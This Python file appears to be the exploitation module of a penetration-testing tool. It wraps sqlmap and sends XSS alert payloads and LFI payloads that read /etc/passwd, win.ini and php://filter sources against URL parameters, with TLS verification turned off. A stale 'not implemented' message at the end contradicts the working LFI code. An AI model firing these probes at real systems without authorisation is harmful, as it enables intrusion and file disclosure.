# Placeholder for Exploitation module
from rich.console import Console
import questionary
from rich.panel import Panel # Import Panel
import logging

from ..core import executor, storage, cli # Use relative imports

log = logging.getLogger(__name__)
console = Console()

def run_exploitation(target):
    log.info(f"Starting Exploitation module for target: {target}")
    console.print(f"\n[bold red]Initiating Exploitation Module for: {target}[/bold red]")

    # Check if target is a URL for relevant exploits
    is_web_target = target.startswith('http://') or target.startswith('https://')
    if not is_web_target:
        log.warning(f"Target '{target}' is not a URL. Web exploitation modules might not apply.")
        console.print(f"[yellow]Warning: Target '{target}' is not a URL. Web exploitation modules might not apply.[/yellow]")
        # We can still proceed, as some exploits might be relevant or user knows best

    while True:
        action = exploit_menu()
        if action == "back":
            break

        log.info(f"Running exploit action: {action} for target: {target}")
        try:
            if action == "sqlmap":
                if not is_web_target:
                    log.warning("SQLMap selected for non-URL target.")
                    console.print("[red]SQLMap requires a URL target.[/red]")
                    input("Press Enter to continue...")
                    continue
                run_sqlmap(target)
            elif action == "xss":
                if not is_web_target:
                    log.warning("XSS selected for non-URL target.")
                    console.print("[red]XSS testing requires a URL target.[/red]")
                    input("Press Enter to continue...")
                    continue
                run_xss_test(target)
            elif action == "lfi_rfi":
                if not is_web_target:
                    log.warning("LFI/RFI selected for non-URL target.")
                    console.print("[red]LFI/RFI testing requires a URL target.[/red]")
                    input("Press Enter to continue...")
                    continue
                run_lfi_rfi_test(target)
            elif action == "metasploit":
                log.info("Metasploit integration selected (Not Implemented).")
                console.print("[yellow]Metasploit integration not implemented yet.[/yellow]")
                input("Press Enter to continue...")
            # Add calls to other exploit functions here
        except Exception as e:
            log.exception(f"Error during exploit action {action} for {target}")
            console.print(f"[bold red]An unexpected error occurred during {action} exploit: {e}[/bold red]")
            input("[yellow]Press Enter to continue...[/yellow]")

    log.info(f"Exiting Exploitation module for target: {target}")

def exploit_menu():
    """Displays the exploitation module menu."""
    choices = [
        questionary.Choice(title="SQL Injection (SQLMap)", value="sqlmap"),
        questionary.Choice(title="Cross-Site Scripting (XSS) Test", value="xss"),
        questionary.Choice(title="LFI/RFI Test", value="lfi_rfi"),
        questionary.Choice(title="Metasploit Interface (Placeholder)", value="metasploit"),
        questionary.Separator(),
        questionary.Choice(title="Back", value="back")
    ]
    action = questionary.select("[EXPLOIT MODULE] Choose Exploit Type:", choices=choices).ask()
    if action is None: return "back"
    return action

def run_sqlmap(target):
    log.info(f"Running SQLMap for {target}")
    console.print(f"\n[cyan]Running SQLMap against {target}...[/cyan]")
    tool = "sqlmap"
    sqlmap_executable = "sqlmap" # Default assumption
    if not executor.check_tool_installed(sqlmap_executable):
        log.debug("sqlmap command not found, checking for sqlmap.py")
        if executor.check_tool_installed("sqlmap.py"): # Needs refinement based on common installs
             sqlmap_executable = "sqlmap.py"
             log.info("Found sqlmap.py executable.")
             console.print("[yellow]Found sqlmap.py, ensure it has execute permissions.[/yellow]")
        else:
            log.error("SQLMap executable (sqlmap or sqlmap.py) not found in PATH.")
            console.print(f"[red]Error: {tool} or sqlmap.py not found in PATH.[/red]")
            console.print("[yellow]Download from http://sqlmap.org/ or clone from https://github.com/sqlmapproject/sqlmap.git[/yellow]")
            input("Press Enter to continue...")
            return
    else:
        log.info(f"Found {sqlmap_executable} executable in PATH.")

    console.print("[yellow]SQLMap integration provides basic options. For advanced use, run sqlmap manually.[/yellow]")
    console.print("[bold red]Warning: Running SQLMap can be intrusive and may disrupt services. Ensure you have permission.[/bold red]")

    sqlmap_run_options = questionary.select(
        "Choose SQLMap run type:",
        choices=[
            questionary.Choice("Basic Test (Level 1 Risk 1 - Less Intrusive)", value="basic"),
            questionary.Choice("Standard Test (Level 3 Risk 2 - More Thorough)", value="standard"),
            questionary.Choice("Run with --wizard (Interactive SQLMap Setup)", value="wizard"),
            questionary.Separator(),
            questionary.Choice("Cancel", value="cancel")
        ]
    ).ask()

    if sqlmap_run_options == "cancel" or sqlmap_run_options is None:
        log.info("SQLMap run cancelled by user.")
        console.print("[yellow]SQLMap run cancelled.[/yellow]")
        return

    command = [sqlmap_executable, "-u", target]
    if sqlmap_run_options == "basic":
        command.extend(["--batch", "--level=1", "--risk=1"])
    elif sqlmap_run_options == "standard":
        command.extend(["--batch", "--level=3", "--risk=2"])
    elif sqlmap_run_options == "wizard":
        command.append("--wizard")
        console.print("[yellow]Starting SQLMap wizard. EthHackX will wait for it to finish.[/yellow]")
        console.print("[yellow]Note: Wizard interaction happens directly in the terminal below.[/yellow]")

    confirm = True
    if sqlmap_run_options != "wizard":
         confirm = questionary.confirm(f"Proceed with SQLMap scan ({sqlmap_run_options}) on {target}?", default=False).ask()
         if confirm is None: # Handle Ctrl+C
              log.info("SQLMap run cancelled by user at confirmation.")
              console.print("[yellow]SQLMap scan cancelled.[/yellow]")
              return

    if confirm:
        log.info(f"Executing SQLMap ({sqlmap_run_options}) with command: {' '.join(command)}")
        console.print(f"[grey50]Executing: {' '.join(command)}[/grey50]")
        capture = sqlmap_run_options != "wizard"
        stdout, stderr = executor.run_command(command, capture_output=capture)

        results = {
            "scan_type": sqlmap_run_options,
            "command": " ".join(command),
            "output": stdout or "(Interactive wizard, no captured output)",
            "errors": stderr or ""
        }
        storage.save_results("exploit_sqlmap", target, results)

        if capture:
            log.info("SQLMap batch scan finished.")
            console.print("[green]SQLMap scan finished.[/green]")
            if stdout:
                # Check for common indication of vulnerabilities
                if "is vulnerable" in stdout.lower():
                     log.warning(f"SQLMap reported potential vulnerabilities for {target}")
                     console.print("[bold yellow]SQLMap reported potential vulnerabilities![/bold yellow]")
                console.print(Panel(stdout, title="SQLMap Output", border_style="blue"))
            if stderr:
                log.warning(f"SQLMap stderr for {target}: {stderr.strip()}")
                console.print(Panel(stderr, title="SQLMap Errors/Warnings", border_style="red"))
        else:
             log.info("SQLMap wizard finished.")
             console.print("[green]SQLMap wizard finished.[/green]")
             console.print("(Output was interactive, check wizard results and sqlmap logs if needed)")
    else:
        log.info("SQLMap scan explicitly cancelled by user.")
        console.print("[yellow]SQLMap scan cancelled.[/yellow]")

    input("Press Enter to continue...")

def run_xss_test(target):
    """Runs very basic XSS payload tests against URL parameters."""
    log.info(f"Running basic XSS test on {target}")
    console.print(f"\n[cyan]Running basic XSS tests against {target}...[/cyan]")
    console.print("[yellow]Warning: This is a VERY basic check, only testing URL parameters.[/yellow]")
    console.print("[yellow]It will not find stored XSS or DOM XSS in most cases.[/yellow]")

    payloads = [
        '<script>alert("EthHackX_XSS_Test")</script>',
        '"><script>alert("EthHackX_XSS_Test")</script>',
        'javascript:alert("EthHackX_XSS_Test");',
        '<img src=x onerror=alert("EthHackX_XSS_Test")>'
    ]

    try:
        import requests
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    except ImportError:
        log.error("XSS test requires 'requests' library.")
        console.print("[red]Error: Requires 'requests' library. Run: pip install requests[/red]")
        input("Press Enter to continue...")
        return

    try:
        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)
    except Exception as e:
        log.exception(f"Failed to parse target URL for XSS test: {target}")
        console.print(f"[red]Error parsing URL '{target}': {e}[/red]")
        input("Press Enter to continue...")
        return

    if not query_params:
        log.info(f"No query parameters found in URL {target} for XSS test.")
        console.print("[yellow]No query parameters found in the URL to test.[/yellow]")
        input("Press Enter to continue...")
        return

    log.debug(f"Found parameters for XSS test: {list(query_params.keys())}")
    console.print(f"Found parameters: {list(query_params.keys())}")
    vulnerable_params = []
    tested_count = 0

    try:
        with requests.Session() as session:
            session.headers.update({'User-Agent': 'Mozilla/5.0 EthHackX_XSS_Test'})
            session.verify = False # Ignore SSL errors for testing
            requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

            for param in query_params:
                original_value = query_params[param][0]
                log.debug(f"Testing XSS on param: {param}")
                console.print(f"  Testing parameter: [magenta]{param}[/magenta]")
                found_reflection_for_param = False
                for payload in payloads:
                    tested_count += 1
                    temp_params = query_params.copy()
                    temp_params[param] = [payload]
                    new_query = urlencode(temp_params, doseq=True)
                    test_url = urlunparse(parsed_url._replace(query=new_query))
                    log.debug(f"    Trying XSS URL: {test_url}")
                    try:
                        response = session.get(test_url, timeout=10, allow_redirects=True)
                        # Check if the payload is reflected in the response body (very basic check)
                        if payload in response.text:
                            log.warning(f"Potential XSS reflection found for param '{param}' in {target} with payload: {payload}")
                            console.print(f"    [bold yellow]Potential reflection found for param '{param}' with payload: {payload}[/bold yellow]")
                            if param not in vulnerable_params:
                                 vulnerable_params.append(param)
                            found_reflection_for_param = True
                            # Consider breaking inner loop once reflection found for a param?
                            # break
                    except requests.exceptions.RequestException as e:
                        log.error(f"Error requesting {test_url} for XSS test: {e}")
                        # console.print(f"    [red]Error requesting {test_url}: {e}[/red]") # Maybe too verbose
                    # Restore original value not strictly necessary due to loop structure but good practice
                    # query_params[param] = [original_value]
    except Exception as e:
         log.exception(f"Unexpected error during XSS testing session for {target}")
         console.print(f"[red]An error occurred during the XSS test: {e}[/red]")

    results = {
        "tested_url": target,
        "parameters_tested": list(query_params.keys()),
        "payloads_used_count": len(payloads),
        "requests_made": tested_count,
        "potentially_vulnerable_params": vulnerable_params,
        "notes": "Basic reflection check only. Manual verification needed."
    }
    storage.save_results("exploit_xss_basic", target, results)

    if vulnerable_params:
        log.info(f"Basic XSS check finished for {target}. Potential params: {vulnerable_params}")
        console.print(f"[bold yellow]Basic XSS checks finished. Potential reflection found in parameters: {vulnerable_params}[/bold yellow]")
        console.print("[bold red]Manual verification is crucial! Reflection does not guarantee execution.[/bold red]")
    else:
        log.info(f"Basic XSS check finished for {target}. No reflections found.")
        console.print("[green]Basic XSS checks finished. No obvious reflections found in tested parameters.[/green]")

    input("Press Enter to continue...")

def run_lfi_rfi_test(target):
    """Runs very basic LFI/RFI payload tests against URL parameters."""
    log.info(f"Running basic LFI/RFI test on {target}")
    console.print(f"\n[cyan]Running basic LFI/RFI tests against {target}...[/cyan]")
    console.print("[yellow]Warning: This is a VERY basic check, only testing URL parameters for file inclusion patterns.[/yellow]")

    lfi_payloads = [
        "../../../../../../../../etc/passwd",
        "../../../../../../../../windows/win.ini",
        "/etc/passwd",
        "C:\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/resource=/etc/passwd"
    ]

    try:
        import requests
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        import base64
    except ImportError as e:
        module = "requests" if "requests" in str(e) else "base64"
        log.error(f"LFI/RFI test requires '{module}' library.")
        console.print(f"[red]Error: Requires '{module}' library.[/red]")
        input("Press Enter to continue...")
        return

    try:
        parsed_url = urlparse(target)
        query_params = parse_qs(parsed_url.query)
    except Exception as e:
        log.exception(f"Failed to parse target URL for LFI/RFI test: {target}")
        console.print(f"[red]Error parsing URL '{target}': {e}[/red]")
        input("Press Enter to continue...")
        return

    if not query_params:
        log.info(f"No query parameters found in URL {target} for LFI/RFI test.")
        console.print("[yellow]No query parameters found in the URL to test.[/yellow]")
        input("Press Enter to continue...")
        return

    log.debug(f"Found parameters for LFI/RFI test: {list(query_params.keys())}")
    console.print(f"Found parameters: {list(query_params.keys())}")
    potentially_vulnerable_findings = []
    tested_count = 0

    try:
        with requests.Session() as session:
            session.headers.update({'User-Agent': 'Mozilla/5.0 EthHackX_LFI_Test'})
            session.verify = False
            requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

            for param in query_params:
                original_value = query_params[param][0]
                log.debug(f"Testing LFI/RFI on param: {param}")
                console.print(f"  Testing parameter: [magenta]{param}[/magenta]")

                for payload in lfi_payloads:
                    tested_count += 1
                    temp_params = query_params.copy()
                    temp_params[param] = [payload]
                    new_query = urlencode(temp_params, doseq=True)
                    test_url = urlunparse(parsed_url._replace(query=new_query))
                    log.debug(f"    Trying LFI URL: {test_url}")

                    try:
                        response = session.get(test_url, timeout=10, allow_redirects=False)
                        success = False
                        reason = ""
                        content_preview = response.text[:200] if response.text else ""

                        if "root:x:0:0" in content_preview:
                            success = True
                            reason = "Detected /etc/passwd content"
                        elif "; for 16-bit app support" in content_preview:
                            success = True
                            reason = "Detected win.ini content"
                        elif payload.startswith("php://filter") and len(response.content) > 20:
                            if "base64-encode" in payload:
                                try:
                                    decoded_content = base64.b64decode(response.content).decode('utf-8', errors='ignore')
                                    if "<?php" in decoded_content[:100] or "root:x:0:0" in decoded_content:
                                        success = True
                                        reason = f"Detected pattern after base64 decoding ({payload})"
                                except Exception as b64_err:
                                    log.debug(f"Base64 decode failed for LFI check: {b64_err}")
                                    pass
                            elif "resource=" in payload and len(response.content) > 50:
                                 if "<html" not in content_preview.lower() and "<body" not in content_preview.lower():
                                    success = True
                                    reason = f"Got non-HTML content with php://filter ({payload})"
                        elif not success and len(response.content) > 100 and "<html" not in content_preview.lower() and "<body" not in content_preview.lower():
                             success = True
                             reason = "Received significant non-HTML content"

                        if success:
                            log.warning(f"Potential LFI found! Param={param}, Payload={payload}, Reason={reason}, URL={target}")
                            console.print(f"    [bold yellow]Potential LFI found![/bold yellow] Param=[cyan]{param}[/cyan], Payload=[magenta]{payload}[/magenta], Reason=[yellow]{reason}[/yellow]")
                            potentially_vulnerable_findings.append({
                                "param": param,
                                "payload": payload,
                                "url": test_url,
                                "reason": reason
                            })
                            # break # Optional: Stop testing this param after first finding?

                    except requests.exceptions.Timeout:
                        log.debug(f"Timeout requesting LFI URL: {test_url}")
                        pass
                    except requests.exceptions.RequestException as e:
                        log.debug(f"Error requesting LFI URL {test_url}: {e}")
                        pass
    except Exception as e:
         log.exception(f"Unexpected error during LFI/RFI testing session for {target}")
         console.print(f"[red]An error occurred during the LFI/RFI test: {e}[/red]")

    results = {
        "tested_url": target,
        "parameters_tested": list(query_params.keys()),
        "lfi_payloads_used_count": len(lfi_payloads),
        "requests_made": tested_count,
        "potential_findings": potentially_vulnerable_findings,
        "notes": "Basic LFI check only on URL parameters. Manual verification crucial."
    }
    storage.save_results("exploit_lfi_basic", target, results)

    if potentially_vulnerable_findings:
        log.info(f"Basic LFI check finished for {target}. Potential findings: {len(potentially_vulnerable_findings)}")
        console.print(f"[bold yellow]Basic LFI checks finished. Potential findings ({len(potentially_vulnerable_findings)}):[/bold yellow]")
        for finding in potentially_vulnerable_findings:
            console.print(f"  - Param: [cyan]{finding['param']}[/cyan], Payload: [magenta]{finding['payload']}[/magenta], Reason: [yellow]{finding['reason']}[/yellow]")
        console.print("[bold red]Manual verification is crucial! Check the response content.[/bold red]")
    else:
        log.info(f"Basic LFI check finished for {target}. No potential inclusions found.")
        console.print("[green]Basic LFI checks finished. No obvious file inclusions found in tested parameters.[/green]")

    input("Press Enter to continue...")

    console.print("[red]LFI/RFI testing not implemented yet. Placeholder only.[/red]")
    # TODO: Implement tests with common payloads (e.g., ../../etc/passwd)
    # results = {"status": "Not Implemented"}
    # storage.save_results("exploit_lfi_rfi", target, results)
    input("Press Enter to continue...") 